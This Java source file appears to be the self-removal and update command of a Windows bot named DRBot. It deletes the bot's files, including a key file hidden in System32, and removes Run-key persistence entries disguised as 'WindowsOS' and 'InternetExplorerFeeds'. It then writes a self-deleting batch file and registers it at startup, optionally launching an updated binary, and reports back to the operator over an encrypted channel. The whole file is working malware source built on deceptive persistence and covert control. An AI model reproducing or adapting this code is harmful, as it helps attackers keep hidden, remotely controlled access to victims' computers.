package com.DRBot.Commands;

import com.DRBot.OS.OsProp;
import com.DRBot.OS.checkOS;
import com.DRBot.SecureLine.SecureLine;
import java.io.PrintWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.nio.file.Path;
import java.util.Formatter;

/**
 *
 * @author MerNat
 */

public class killBot implements Runnable {
    private ProcessBuilder pBregBot,pBguardBot,pBmakeBat;
    private Process prRegBot,prGuardBot,prMakeBat;
    private PrintWriter writer;
    private final File guardPath,botEnPath,keyPath,logFile;
    private final  File batFile;
    private Formatter forOut;
    private boolean toUpdate = false;
    private Path myPath;
    private SecureLine secureLine;
    
    killBot(PrintWriter writer,SecureLine secureLine){
        this.writer = writer;
        this.secureLine = secureLine;
        guardPath = new File(com.DRBot.OS.checkOS.getsecPath());
        botEnPath = new File(com.DRBot.OS.checkOS.getEncPath());
        keyPath = new File("C:\\Windows\\System32\\configSystem32.txt");
        batFile = new File(System.getenv("APPDATA").replace("\\","\\\\").replace("%20"," ")+"\\"+"tempDel.bat");
        logFile = new File("logTo");
        try{
            forOut = new Formatter(batFile);
        }
        catch(FileNotFoundException ff){}
    }
    killBot(Path myPath){
            guardPath = new File(com.DRBot.OS.checkOS.getsecPath());
            botEnPath = new File(com.DRBot.OS.checkOS.getEncPath());
            keyPath = new File("C:\\Windows\\System32\\configSystem32.txt");
            batFile = new File(System.getenv("APPDATA").replace("\\","\\\\").replace("%20"," ")+"\\"+"tempDel.bat");
            logFile = new File("logTo");
            try{
            forOut = new Formatter(batFile);
            }
            catch(FileNotFoundException ee){}
            toUpdate = true;
            this.myPath = myPath;
        }
    @Override
        public void run(){
           guardPath.delete();
           botEnPath.delete();
           keyPath.delete();
           logFile.delete();
        try {
            removeRegBot();
            removeRegGuardBot();
        } catch (IOException ex) {
        } catch (InterruptedException ex) {
        }
            if(toUpdate==false){
            toPrint("[Killing Bot] The Bot is dead.");
            }
         createBatRemover();
        try {
            createBatReg();
        } 
          catch (IOException ex) {}
          catch (InterruptedException ex) {}
        System.exit(0);
        }
    private void removeRegBot()throws IOException, InterruptedException{
    OsProp osprop = new OsProp();
    String ospropW = osprop.shortOs();
    if(ospropW.equals("win8") || ospropW.equals("win8.1")){
        pBregBot = new ProcessBuilder("reg","delete","HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "/v",
    "WindowsOS",
    "/f");
    prRegBot = pBregBot.start();
    prRegBot.waitFor();
    prRegBot.destroy();
    }
    else{
    pBregBot = new ProcessBuilder("reg","delete","HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "/v",
    "WindowsOS",
    "/f");
    prRegBot = pBregBot.start();
    prRegBot.waitFor();
    prRegBot.destroy();
    }
    }
    private void removeRegGuardBot()throws IOException, InterruptedException{
        OsProp osprop = new OsProp();
        String ospropW = osprop.shortOs();
        if(ospropW.equals("win8") || ospropW.equals("win8.1")){
            pBguardBot = new ProcessBuilder("reg","delete","HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v",
            "InternetExplorerFeeds",
            "/f");
        prGuardBot = pBguardBot.start();
        prGuardBot.waitFor();
        prGuardBot.destroy();
        }
        else{
        pBguardBot = new ProcessBuilder("reg","delete","HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v",
            "InternetExplorerFeeds",
            "/f");
        prGuardBot = pBguardBot.start();
        prGuardBot.waitFor();
        prGuardBot.destroy();
        }
    }
    private void createBatRemover(){
        OsProp osprop = new OsProp();
        String ospropW = osprop.shortOs();
        if(ospropW.equals("win8") || ospropW.equals("win8.1")){
            if(toUpdate == false){
        forOut.format("%s\r\n%s%s\r\n%s\r\n%s\r\n","@echo off","del /f /A:H ",checkOS.getBotName(),
                "reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v tempDel /f",
                "exit");
        forOut.flush();
        }
        else{
            forOut.format("%s\r\n%s%s\r\n%s\r\n%s\r\n%s\r\n","@echo off","del /f /A:H ",checkOS.getBotName(),
                "reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v tempDel /f",
                "cmd /C " + getDir(myPath.toString()),
                "exit");
        forOut.flush();
        }
        }
        else{
        if(toUpdate == false){
        forOut.format("%s\r\n%s%s\r\n%s\r\n%s\r\n","@echo off","del /f /A:H ",checkOS.getBotName(),
                "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v tempDel /f",
                "exit");
        forOut.flush();
        }
        else{
            forOut.format("%s\r\n%s%s\r\n%s\r\n%s\r\n%s\r\n","@echo off","del /f /A:H ",checkOS.getBotName(),
                "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v tempDel /f",
                "cmd /C "+getDir(myPath.toString()),
                "exit");
        forOut.flush();
        }
        }
    }
    private void createBatReg() throws IOException, InterruptedException{
        OsProp osprop = new OsProp();
        String ospropW = osprop.shortOs();
        if(ospropW.equals("win8") || ospropW.equals("win8.1")){
            pBmakeBat = new ProcessBuilder("reg",
        "add",
        "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "/v",
        "tempDel",
        "/d",
        batFile.toPath().toString(),
        "/f");
        prMakeBat = pBmakeBat.start();
        prMakeBat.waitFor();
        prMakeBat.destroy();
        }
        else{
         pBmakeBat = new ProcessBuilder("reg",
        "add",
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "/v",
        "tempDel",
        "/d",
        batFile.toPath().toString(),
        "/f");
        prMakeBat = pBmakeBat.start();
        prMakeBat.waitFor();
        prMakeBat.destroy();   
        }
    }
    private void toPrint(String toPrint){
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
    private String getDir(String toAnal){
        String[] temp1 = toAnal.split("\\\\");
        String newSt = "";
        for(String uy: temp1){
            if(uy.indexOf(" ")!=-1){
                newSt = newSt +"\\"+"\"" + uy + "\""+"\\";
            }
            else
                {
                newSt = newSt +"\\"+uy+"\\";
            }
        }
        String newStr = newSt.substring(1,newSt.length()-1);
        return newStr.replace("\\\\","\\");
    }
}
